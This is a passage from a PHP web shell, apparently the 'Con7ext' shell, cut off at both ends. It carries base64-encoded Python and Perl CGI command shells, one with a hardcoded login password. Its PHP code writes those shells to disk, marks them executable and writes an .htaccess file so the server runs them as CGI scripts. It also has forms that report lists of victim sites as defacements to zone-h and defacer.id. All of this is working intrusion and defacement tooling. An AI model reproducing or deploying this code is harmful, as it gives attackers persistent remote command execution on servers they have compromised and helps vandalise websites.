3RyZnRpbWUNCmltcG9ydCB0cmFjZWJhY2sNCmZyb20gU3RyaW5nSU8gaW1wb3J0IFN0cmluZ0lPDQpmcm9tIHRyYWNlYmFjayBpbXBvcnQgcHJpbnRfZXhjDQoNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCiMgY29uc3RhbnRzDQoNCmZvbnRsaW5lID0gJzxGT05UIENPTE9SPSM0MjQyNDIgc3R5bGU9ImZvbnQtZmFtaWx5OnRpbWVzO2ZvbnQtc2l6ZToxMnB0OyI+Jw0KdmVyc2lvbnN0cmluZyA9ICdWZXJzaW9uIDEuMC4wIDd0aCBKdWx5IDIwMDQnDQoNCmlmIG9zLmVudmlyb24uaGFzX2tleSgiU0NSSVBUX05BTUUiKToNCiAgICBzY3JpcHRuYW1lID0gb3MuZW52aXJvblsiU0NSSVBUX05BTUUiXQ0KZWxzZToNCiAgICBzY3JpcHRuYW1lID0gIiINCg0KTUVUSE9EID0gJyJQT1NUIicNCg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KIyBQcml2YXRlIGZ1bmN0aW9ucyBhbmQgdmFyaWFibGVzDQoNCmRlZiBnZXRmb3JtKHZhbHVlbGlzdCwgdGhlZm9ybSwgbm90cHJlc2VudD0nJyk6DQogICAgIiIiVGhpcyBmdW5jdGlvbiwgZ2l2ZW4gYSBDR0kgZm9ybSwgZXh0cmFjdHMgdGhlIGRhdGEgZnJvbSBpdCwgYmFzZWQgb24NCiAgICB2YWx1ZWxpc3QgcGFzc2VkIGluLiBBbnkgbm9uLXByZXNlbnQgdmFsdWVzIGFyZSBzZXQgdG8gJycgLSBhbHRob3VnaCB0aGlzIGNhbiBiZSBjaGFuZ2VkLg0KICAgIChlLmcuIHRvIHJldHVybiBOb25lIHNvIHlvdSBjYW4gdGVzdCBmb3IgbWlzc2luZyBrZXl3b3JkcyAtIHdoZXJlICcnIGlzIGEgdmFsaWQgYW5zd2VyIGJ1dCB0byBoYXZlIHRoZSBmaWVsZCBtaXNzaW5nIGlzbid0LikiIiINCiAgICBkYXRhID0ge30NCiAgICBmb3IgZmllbGQgaW4gdmFsdWVsaXN0Og0KICAgICAgICBpZiBub3QgdGhlZm9ybS5oYXNfa2V5KGZpZWxkKToNCiAgICAgICAgICAgIGRhdGFbZmllbGRdID0gbm90cHJlc2VudA0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgaWYgIHR5cGUodGhlZm9ybVtmaWVsZF0pICE9IHR5cGUoW10pOg0KICAgICAgICAgICAgICAgIGRhdGFbZmllbGRdID0gdGhlZm9ybVtmaWVsZF0udmFsdWUNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgdmFsdWVzID0gbWFwKGxhbWJkYSB4OiB4LnZhbHVlLCB0aGVmb3JtW2ZpZWxkXSkgICAgICMgYWxsb3dzIGZvciBsaXN0IHR5cGUgdmFsdWVzDQogICAgICAgICAgICAgICAgZGF0YVtmaWVsZF0gPSB2YWx1ZXMNCiAgICByZXR1cm4gZGF0YQ0KDQoNCnRoZWZvcm1oZWFkID0gIiIiPEhUTUw+PEhFQUQ+PFRJVExFPmNnaS1zaGVsbC5weSAtIGEgQ0dJIGJ5IEZ1enp5bWFuPC9USVRMRT48L0hFQUQ+DQo8Qk9EWT48Q0VOVEVSPg0KPEgxPldlbGNvbWUgdG8gY2dpLXNoZWxsLnB5IC0gPEJSPmEgUHl0aG9uIENHSTwvSDE+DQo8Qj48ST5CeSBGdXp6eW1hbjwvQj48L0k+PEJSPg0KIiIiK2ZvbnRsaW5lICsiVmVyc2lvbiA6ICIgKyB2ZXJzaW9uc3RyaW5nICsgIiIiLCBSdW5uaW5nIG9uIDogIiIiICsgc3RyZnRpbWUoJyVJOiVNICVwLCAlQSAlZCAlQiwgJVknKSsnLjwvQ0VOVEVSPjxCUj4nDQoNCnRoZWZvcm0gPSAiIiI8SDI+RW50ZXIgQ29tbWFuZDwvSDI+DQo8Rk9STSBNRVRIT0Q9XCIiIiIgKyBNRVRIT0QgKyAnIiBhY3Rpb249IicgKyBzY3JpcHRuYW1lICsgIiIiXCI+DQo8aW5wdXQgbmFtZT1jbWQgdHlwZT10ZXh0PjxCUj4NCjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iU3VibWl0Ij48QlI+DQo8L0ZPUk0+PEJSPjxCUj4iIiINCmJvZHllbmQgPSAnPC9CT0RZPjwvSFRNTD4nDQplcnJvcm1lc3MgPSAnPENFTlRFUj48SDI+U29tZXRoaW5nIFdlbnQgV3Jvbmc8L0gyPjxCUj48UFJFPicNCg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KIyBtYWluIGJvZHkgb2YgdGhlIHNjcmlwdA0KDQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOg0KICAgIHByaW50ICJDb250ZW50LXR5cGU6IHRleHQvaHRtbCIgICAgICAgICAjIHRoaXMgaXMgdGhlIGhlYWRlciB0byB0aGUgc2VydmVyDQogICAgcHJpbnQgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgc28gaXMgdGhpcyBibGFuayBsaW5lDQogICAgZm9ybSA9IGNnaS5GaWVsZFN0b3JhZ2UoKQ0KICAgIGRhdGEgPSBnZXRmb3JtKFsnY21kJ10sZm9ybSkNCiAgICB0aGVjbWQgPSBkYXRhWydjbWQnXQ0KICAgIHByaW50IHRoZWZvcm1oZWFkDQogICAgcHJpbnQgdGhlZm9ybQ0KICAgIGlmIHRoZWNtZDoNCiAgICAgICAgcHJpbnQgJzxIUj48QlI+PEJSPicNCiAgICAgICAgcHJpbnQgJzxCPkNvbW1hbmQgOiAnLCB0aGVjbWQsICc8QlI+PEJSPicNCiAgICAgICAgcHJpbnQgJ1Jlc3VsdCA6IDxCUj48QlI+Jw0KICAgICAgICB0cnk6DQogICAgICAgICAgICBjaGlsZF9zdGRpbiwgY2hpbGRfc3Rkb3V0ID0gb3MucG9wZW4yKHRoZWNtZCkNCiAgICAgICAgICAgIGNoaWxkX3N0ZGluLmNsb3NlKCkNCiAgICAgICAgICAgIHJlc3VsdCA9IGNoaWxkX3N0ZG91dC5yZWFkKCkNCiAgICAgICAgICAgIGNoaWxkX3N0ZG91dC5jbG9zZSgpDQogICAgICAgICAgICBwcmludCByZXN1bHQucmVwbGFjZSgnXG4nLCAnPEJSPicpDQoNCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiwgZTogICAgICAgICAgICAgICAgICAgICAgIyBhbiBlcnJvciBpbiBleGVjdXRpbmcgdGhlIGNvbW1hbmQNCiAgICAgICAgICAgIHByaW50IGVycm9ybWVzcw0KICAgICAgICAgICAgZiA9IFN0cmluZ0lPKCkNCiAgICAgICAgICAgIHByaW50X2V4YyhmaWxlPWYpDQogICAgICAgICAgICBhID0gZi5nZXR2YWx1ZSgpLnNwbGl0bGluZXMoKQ0KICAgICAgICAgICAgZm9yIGxpbmUgaW4gYToNCiAgICAgICAgICAgICAgICBwcmludCBsaW5lDQoNCiAgICBwcmludCBib2R5ZW5kDQoNCg0KIiIiDQpUT0RPL0lTU1VFUw0KDQoNCg0KQ0hBTkdFTE9HDQoNCjA3LTA3LTA0ICAgICAgICBWZXJzaW9uIDEuMC4wDQpBIHZlcnkgYmFzaWMgc3lzdGVtIGZvciBleGVjdXRpbmcgc2hlbGwgY29tbWFuZHMuDQpJIG1heSBleHBhbmQgaXQgaW50byBhIHByb3BlciAnZW52aXJvbm1lbnQnIHdpdGggc2Vzc2lvbiBwZXJzaXN0ZW5jZS4uLg0KIiIi";
	$cgi = fopen($file_cgi, "w");
	fwrite($cgi, base64_decode($cgi_script));
	fwrite($htcgi, $isi_htcgi);
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<br><center>Done ... <a href='con7ext_cgi/cgipy.con7ext' target='_blank'>Klik Here</a>";
} elseif($_GET['mirror'] == 'zoneh') {
	if($_POST['submit']) {
		$domain = explode("\r\n", $_POST['url']);
		$nick =  $_POST['nick'];
		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
				echo "$url -> <font color=lime>OK</font><br>";
			} else {
				echo "$url -> <font color=red>ERROR</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='Con7ext'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
		<input type='submit' name='submit' value='Submit' style='width: 450px;'>
		</form>";
	}
	echo "</center>";
} elseif($_GET['mirror'] == 'defid') {
echo "
<center>
<form method='POST' action=''>
Attacker : <br><input type='text' name='nick' placeholder='isiin nickmu'><br>
Team : <br><input type='text' name='team' placeholder='isiin teammu'><br>
Sites : <br><textarea class='form-control con7' name='sites' placeholder='http://korban.com/' cols='50' rows='12'></textarea><br>
<input type='submit' name='sikat' value='Submit!!'>
</form>
</html>";
$nick = $_POST['nick'];
$team = $_POST['team'];
$sikat = $_POST['sikat'];
$url = explode("\r\n", $_POST['sites']);
if($sikat){
echo "Notify with nick [ ".$nick." ] and With Team [ ".$team." ] <br>";
foreach($url as $url) {
$defid = defid($url,$nick,$team);
if(preg_match('#<div class="success-box">#', $defid)) {
echo "OK -> ".$url."<br>";
} else {
echo "Error -> ".$url."<br>";
    }
}
}
} elseif($_GET['jancok'] == 'cgi') {
	$cgi_dir = mkdir('con7ext_cgi', 0755);
        chdir('con7ext_cgi');
	$file_cgi = "cgi.con7ext";
        $memeg = ".htaccess";
	$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .con7ext \n AddHandler cgi-script .con7ext \n AddHandler cgi-script .con7ext";
	$htcgi = fopen(".htaccess", "w");
	$cgi_script = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQp1c2UgTUlNRTo6QmFzZTY0Ow0KJFZlcnNpb249ICJDR0ktVGVsbmV0IFZlcnNpb24gMS4zIjsNCiRFZGl0UGVyc2lvbj0iPGZvbnQgc3R5bGU9J3RleHQtc2hhZG93OiAwcHggMHB4IDZweCByZ2IoMjU1LCAwLCAwKSwgMHB4IDBweCA1cHggcmdiKDMwMCwgMCwgMCksIDBweCAwcHggNXB4IHJnYigzMDAsIDAsIDApOyBjb2xvcjojZmZmZmZmOyBmb250LXdlaWdodDpib2xkOyc+YjM3NGsgLSBDR0ktVGVsbmV0PC9mb250PiI7DQoNCiRQYXNzd29yZCA9ICJ4YWlzeW5kaWNhdGUiOwkJCSMgQ2hhbmdlIHRoaXMuIFlvdSB3aWxsIG5lZWQgdG8gZW50ZXIgdGhpcyB0byBsb2dpbi4NCnN1YiBJc19XaW4oKXsNCgkkb3MgPSAmdHJpbSgkRU5WeyJTRVJWRVJfU09GVFdBUkUifSk7DQoJaWYoJG9zID1+IG0vd2luL2kpew0KCQlyZXR1cm4gMTsNCgl9DQoJZWxzZXsNCgkJcmV0dXJuIDA7DQoJfQ0KfQ0KJFdpbk5UID0gJklzX1dpbigpOwkJCQkjIFlvdSBuZWVkIHRvIGNoYW5nZSB0aGUgdmFsdWUgb2YgdGhpcyB0byAxIGlmDQoJCQkJCQkJCSMgeW91J3JlIHJ1bm5pbmcgdGhpcyBzY3JpcHQgb24gYSBXaW5kb3dzIE5UDQoJCQkJCQkJCSMgbWFjaGluZS4gSWYgeW91J3JlIHJ1bm5pbmcgaXQgb24gVW5peCwgeW91DQoJCQkJCQkJCSMgY2FuIGxlYXZlIHRoZSB2YWx1ZSBhcyBpdCBpcy4NCg0KJE5UQ21kU2VwID0gIiYiOwkJCQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcw0KCQkJCQkJCQkjIGluIGEgY29tbWFuZCBsaW5lIG9uIFdpbmRvd3MgTlQuDQoNCiRVbml4Q21kU2VwID0gIjsiOwkJCQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcw0KCQkJCQkJCQkjIGluIGEgY29tbWFuZCBsaW5lIG9uIFVuaXguDQoNCiRDb21tYW5kVGltZW91dER1cmF0aW9uID0gMTAwMDA7CSMgVGltZSBpbiBzZWNvbmRzIGFmdGVyIGNvbW1hbmRzIHdpbGwgYmUga2lsbGVkDQoJCQkJCQkJCSMgRG9uJ3Qgc2V0IHRoaXMgdG8gYSB2ZXJ5IGxhcmdlIHZhbHVlLiBUaGlzIGlzDQoJCQkJCQkJCSMgdXNlZnVsIGZvciBjb21tYW5kcyB0aGF0IG1heSBoYW5nIG9yIHRoYXQNCgkJCQkJCQkJIyB0YWtlIHZlcnkgbG9uZyB0byBleGVjdXRlLCBsaWtlICJmaW5kIC8iLg0KCQkJCQkJCQkjIFRoaXMgaXMgdmFsaWQgb25seSBvbiBVbml4IHNlcnZlcnMuIEl0IGlzDQoJCQkJCQkJCSMgaWdub3JlZCBvbiBOVCBTZXJ2ZXJzLg0KDQokU2hvd0R5bmFtaWNPdXRwdXQgPSAxOwkJCSMgSWYgdGhpcyBpcyAxLCB0aGVuIGRhdGEgaXMgc2VudCB0byB0aGUNCgkJCQkJCQkJIyBicm93c2VyIGFzIHNvb24gYXMgaXQgaXMgb3V0cHV0LCBvdGhlcndpc2UNCgkJCQkJCQkJIyBpdCBpcyBidWZmZXJlZCBhbmQgc2VuZCB3aGVuIHRoZSBjb21tYW5kDQoJCQkJCQkJCSMgY29tcGxldGVzLiBUaGlzIGlzIHVzZWZ1bCBmb3IgY29tbWFuZHMgbGlrZQ0KCQkJCQkJCQkjIHBpbmcsIHNvIHRoYXQgeW91IGNhbiBzZWUgdGhlIG91dHB1dCBhcyBpdA0KCQkJCQkJCQkjIGlzIGJlaW5nIGdlbmVyYXRlZC4NCg0KIyBET04nVCBDSEFOR0UgQU5ZVEhJTkcgQkVMT1cgVEhJUyBMSU5FIFVOTEVTUyBZT1UgS05PVyBXSEFUIFlPVSdSRSBET0lORyAhIQ0KDQokQ21kU2VwID0gKCRXaW5OVCA/ICROVENtZFNlcCA6ICRVbml4Q21kU2VwKTsNCiRDbWRQd2QgPSAoJFdpbk5UID8gImNkIiA6ICJwd2QiKTsNCiRQYXRoU2VwID0gKCRXaW5OVCA/ICJcXCIgOiAiLyIpOw0KJFJlZGlyZWN0b3IgPSAoJFdpbk5UID8gIiAyPiYxIDE+JjIiIDogIiAxPiYxIDI+JjEiKTsNCiRjb2xzPSAxNTA7DQokcm93cz0gMjY7DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFJlYWRzIHRoZSBpbnB1dCBzZW50IGJ5IHRoZSBicm93c2VyIGFuZCBwYXJzZXMgdGhlIGlucHV0IHZhcmlhYmxlcy4gSXQNCiMgcGFyc2VzIEdFVCwgUE9TVCBhbmQgbXVsdGlwYXJ0L2Zvcm0tZGF0YSB0aGF0IGlzIHVzZWQgZm9yIHVwbG9hZGluZyBmaWxlcy4NCiMgVGhlIGZpbGVuYW1lIGlzIHN0b3JlZCBpbiAkaW57J2YnfSBhbmQgdGhlIGRhdGEgaXMgc3RvcmVkIGluICRpbnsnZmlsZWRhdGEnfS4NCiMgT3RoZXIgdmFyaWFibGVzIGNhbiBiZSBhY2Nlc3NlZCB1c2luZyAkaW57J3Zhcid9LCB3aGVyZSB2YXIgaXMgdGhlIG5hbWUgb2YNCiMgdGhlIHZhcmlhYmxlLiBOb3RlOiBNb3N0IG9mIHRoZSBjb2RlIGluIHRoaXMgZnVuY3Rpb24gaXMgdGFrZW4gZnJvbSBvdGhlciBDR0kNCiMgc2NyaXB0cy4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBSZWFkUGFyc2UgDQp7DQoJbG9jYWwgKCppbikgPSBAXyBpZiBAXzsNCglsb2NhbCAoJGksICRsb2MsICRrZXksICR2YWwpOw0KCQ0KCSRNdWx0aXBhcnRGb3JtRGF0YSA9ICRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvOw0KDQoJaWYoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAiR0VUIikNCgl7DQoJCSRpbiA9ICRFTlZ7J1FVRVJZX1NUUklORyd9Ow0KCX0NCgllbHNpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJQT1NUIikNCgl7DQoJCWJpbm1vZGUoU1RESU4pIGlmICRNdWx0aXBhcnRGb3JtRGF0YSAmICRXaW5OVDsNCgkJcmVhZChTVERJTiwgJGluLCAkRU5WeydDT05URU5UX0xFTkdUSCd9KTsNCgl9DQoNCgkjIGhhbmRsZSBmaWxlIHVwbG9hZCBkYXRhDQoJaWYoJEVOVnsnQ09OVEVOVF9UWVBFJ30gPX4gL211bHRpcGFydFwvZm9ybS1kYXRhOyBib3VuZGFyeT0oLispJC8pDQoJew0KCQkkQm91bmRhcnkgPSAnLS0nLiQxOyAjIHBsZWFzZSByZWZlciB0byBSRkMxODY3IA0KCQlAbGlzdCA9IHNwbGl0KC8kQm91bmRhcnkvLCAkaW4pOyANCgkJJEhlYWRlckJvZHkgPSAkbGlzdFsxXTsNCgkJJEhlYWRlckJvZHkgPX4gL1xyXG5cclxufFxuXG4vOw0KCQkkSGVhZGVyID0gJGA7DQoJCSRCb2R5ID0gJCc7DQogCQkkQm9keSA9fiBzL1xyXG4kLy87ICMgdGhlIGxhc3QgXHJcbiB3YXMgcHV0IGluIGJ5IE5ldHNjYXBlDQoJCSRpbnsnZmlsZWRhdGEnfSA9ICRCb2R5Ow0KCQkkSGVhZGVyID1+IC9maWxlbmFtZT1cIiguKylcIi87IA0KCQkkaW57J2YnfSA9ICQxOyANCgkJJGlueydmJ30gPX4gcy9cIi8vZzsNCgkJJGlueydmJ30gPX4gcy9ccy8vZzsNCg0KCQkjIHBhcnNlIHRyYWlsZXINCgkJZm9yKCRpPTI7ICRsaXN0WyRpXTsgJGkrKykNCgkJeyANCgkJCSRsaXN0WyRpXSA9fiBzL14uK25hbWU9JC8vOw0KCQkJJGxpc3RbJGldID1+IC9cIihcdyspXCIvOw0KCQkJJGtleSA9ICQxOw0KCQkJJHZhbCA9ICQnOw0KCQkJJHZhbCA9fiBzLyheKFxyXG5cclxufFxuXG4pKXwoXHJcbiR8XG4kKS8vZzsNCgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQoJCQkkaW57JGtleX0gPSAkdmFsOyANCgkJfQ0KCX0NCgllbHNlICMgc3RhbmRhcmQgcG9zdCBkYXRhICh1cmwgZW5jb2RlZCwgbm90IG11bHRpcGFydCkNCgl7DQoJCUBpbiA9IHNwbGl0KC8mLywgJGluKTsNCgkJZm9yZWFjaCAkaSAoMCAuLiAkI2luKQ0KCQl7DQoJCQkkaW5bJGldID1+IHMvXCsvIC9nOw0KCQkJKCRrZXksICR2YWwpID0gc3BsaXQoLz0vLCAkaW5bJGldLCAyKTsNCgkJCSRrZXkgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQoJCQkkdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOw0KCQkJJGlueyRrZXl9IC49ICJcMCIgaWYgKGRlZmluZWQoJGlueyRrZXl9KSk7DQoJCQkkaW57JGtleX0gLj0gJHZhbDsNCgkJfQ0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgUGFnZSBIZWFkZXINCiMgQXJndW1lbnQgMTogRm9ybSBpdGVtIG5hbWUgdG8gd2hpY2ggZm9jdXMgc2hvdWxkIGJlIHNldA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50UGFnZUhlYWRlcg0Kew0KCSRFbmNvZGVkQ3VycmVudERpciA9ICRDdXJyZW50RGlyOw0KCSRFbmNvZGVkQ3VycmVudERpciA9fiBzLyhbXmEtekEtWjAtOV0pLyclJy51bnBhY2soIkgqIiwkMSkvZWc7DQoJbXkgJGRpciA9JEN1cnJlbnREaXI7DQoJJGRpcj1+IHMvXFwvXFxcXC9nOw0KCXByaW50ICJDb250ZW50LXR5cGU6IHRleHQvaHRtbFxuXG4iOw0KCXByaW50IDw8RU5EOw0KPGh0bWw+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9ImNvbnRlbnQtdHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PVVURi04Ij4NCjx0aXRsZT5IYWNzdWdpYTwvdGl0bGU+DQoNCiRIdG1sTWV0YUhlYWRlcg0KDQo8L2hlYWQ+DQo8c3R5bGU+DQpib2R5ew0KZm9udDogMTBwdCBWZXJkYW5hOw0KfQ0KdHIgew0KQk9SREVSLVJJR0hUOiAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItVE9QOiAgICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1MRUZUOiAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUJPVFRPTTogIzNlM2UzZSAxcHggc29saWQ7DQpjb2xvcjogI2ZmOTkwMDsNCn0NCnRkIHsNCkJPUkRFUi1SSUdIVDogICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItTEVGVDogICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1CT1RUT006ICMzZTNlM2UgMXB4IHNvbGlkOw0KY29sb3I6ICMyQkE4RUM7DQpmb250OiAxMHB0IFZlcmRhbmE7DQp9DQoNCnRhYmxlIHsNCkJPUkRFUi1SSUdIVDogICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItTEVGVDogICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1CT1RUT006ICMzZTNlM2UgMXB4IHNvbGlkOw0KQkFDS0dST1VORC1DT0xPUjogIzExMTsNCn0NCg0KDQppbnB1dCB7DQpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUxFRlQ6ICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsNCkJBQ0tHUk9VTkQtQ09MT1I6IEJsYWNrOw0KZm9udDogMTBwdCBWZXJkYW5hOw0KY29sb3I6ICNmZjk5MDA7DQp9DQoNCmlucHV0LnN1Ym1pdCB7DQp0ZXh0LXNoYWRvdzogMHB0IDBwdCAwLjNlbSBjeWFuLCAwcHQgMHB0IDAuM2VtIGN5YW47DQpjb2xvcjogI0ZGRkZGRjsNCmJvcmRlci1jb2xvcjogIzAwOTkwMDsNCn0NCg0KY29kZSB7DQpib3JkZXIJCQk6IGRhc2hlZCAwcHggIzMzMzsNCkJBQ0tHUk9VTkQtQ09MT1I6IEJsYWNrOw0KZm9udDogMTBwdCBWZXJkYW5hIGJvbGQ7DQpjb2xvcjogd2hpbGU7DQp9DQoNCnJ1biB7DQpib3JkZXIJCQk6IGRhc2hlZCAwcHggIzMzMzsNCmZvbnQ6IDEwcHQgVmVyZGFuYSBib2xkOw0KY29sb3I6ICNGRjAwQUE7DQp9DQoNCnRleHRhcmVhIHsNCkJPUkRFUi1SSUdIVDogICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItTEVGVDogICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1CT1RUT006ICMzZTNlM2UgMXB4IHNvbGlkOw0KQkFDS0dST1VORC1DT0xPUjogIzFiMWIxYjsNCmZvbnQ6IEZpeGVkc3lzIGJvbGQ7DQpjb2xvcjogI2FhYTsNCn0NCkE6bGluayB7DQoJQ09MT1I6ICMyQkE4RUM7IFRFWFQtREVDT1JBVElPTjogbm9uZQ0KfQ0KQTp2aXNpdGVkIHsNCglDT0xPUjogIzJCQThFQzsgVEVYVC1ERUNPUkFUSU9OOiBub25lDQp9DQpBOmhvdmVyIHsNCgl0ZXh0LXNoYWRvdzogMHB0IDBwdCAwLjNlbSBjeWFuLCAwcHQgMHB0IDAuM2VtIGN5YW47DQoJY29sb3I6ICNmZjk5MDA7IFRFWFQtREVDT1JBVElPTjogbm9uZQ0KfQ0KQTphY3RpdmUgew0KCWNvbG9yOiBSZWQ7IFRFWFQtREVDT1JBVElPTjogbm9uZQ0KfQ0KDQoubGlzdGRpciB0cjpob3ZlcnsNCgliYWNrZ3JvdW5kOiAjNDQ0Ow0KfQ0KLmxpc3RkaXIgdHI6aG92ZXIgdGR7DQoJYmFja2dyb3VuZDogIzQ0NDsNCgl0ZXh0LXNoYWRvdzogMHB0IDBwdCAwLjNlbSBjeWFuLCAwcHQgMHB0IDAuM2VtIGN5YW47DQoJY29sb3I6ICNGRkZGRkY7IFRFWFQtREVDT1JBVElPTjogbm9uZTsNCn0NCi5ub3RsaW5lew0KCWJhY2tncm91bmQ6ICMxMTE7DQp9DQoubGluZXsNCgliYWNrZ3JvdW5kOiAjMjIyOw0KfQ0KPC9zdHlsZT4NCjxzY3JpcHQgbGFuZ3VhZ2U9ImphdmFzY3JpcHQiPg0KZnVuY3Rpb24gY2htb2RfZm9ybShpLGZpbGUpDQp7DQoJLyp2YXIgYWpheD0nYWpheF9Qb3N0RGF0YSgiRm9ybVBlcm1zXycraSsnIiwiJFNjcmlwdExvY2F0aW9uIiwiUmVzcG9uc2VEYXRhIik7IHJldHVybiBmYWxzZTsnOyovDQoJdmFyIGFqYXg9IiI7DQoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVQZXJtc18iK2kpLmlubmVySFRNTD0iPGZvcm0gbmFtZT1Gb3JtUGVybXNfIiArIGkrICIgYWN0aW9uPScgbWV0aG9kPSdQT1NUJz48aW5wdXQgaWQ9dGV4dF8iICsgaSArICIgIG5hbWU9Y2htb2QgdHlwZT10ZXh0IHNpemU9NSAvPjxpbnB1dCB0eXBlPXN1Ym1pdCBjbGFzcz0nc3VibWl0JyBvbmNsaWNrPSciICsgYWpheCArICInIHZhbHVlPU9LPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWEgdmFsdWU9J2d1aSc+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZCB2YWx1ZT0nJGRpcic+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZiB2YWx1ZT0nIitmaWxlKyInPjwvZm9ybT4iOw0KCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ0ZXh0XyIgKyBpKS5mb2N1cygpOw0KfQ0KZnVuY3Rpb24gcm1fY2htb2RfZm9ybShyZXNwb25zZSxpLHBlcm1zLGZpbGUpDQp7DQoJcmVzcG9uc2UuaW5uZXJIVE1MID0gIjxzcGFuIG9uY2xpY2s9XFxcImNobW9kX2Zvcm0oIiArIGkgKyAiLCciKyBmaWxlKyAiJylcXFwiID4iKyBwZXJtcyArIjwvc3Bhbj48L3RkPiI7DQp9DQpmdW5jdGlvbiByZW5hbWVfZm9ybShpLGZpbGUsZikNCnsNCgl2YXIgYWpheD0iIjsNCglmLnJlcGxhY2UoL1xcXFwvZywiXFxcXFxcXFwiKTsNCgl2YXIgYmFjaz0icm1fcmVuYW1lX2Zvcm0oIitpKyIsXFxcIiIrZmlsZSsiXFxcIixcXFwiIitmKyJcXFwiKTsgcmV0dXJuIGZhbHNlOyI7DQoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVfIitpKS5pbm5lckhUTUw9Ijxmb3JtIG5hbWU9Rm9ybVBlcm1zXyIgKyBpKyAiIGFjdGlvbj0nIG1ldGhvZD0nUE9TVCc+PGlucHV0IGlkPXRleHRfIiArIGkgKyAiICBuYW1lPXJlbmFtZSB0eXBlPXRleHQgdmFsdWU9ICciK2ZpbGUrIicgLz48aW5wdXQgdHlwZT1zdWJtaXQgY2xhc3M9J3N1Ym1pdCcgb25jbGljaz0nIiArIGFqYXggKyAiJyB2YWx1ZT1PSz48aW5wdXQgdHlwZT1zdWJtaXQgY2xhc3M9J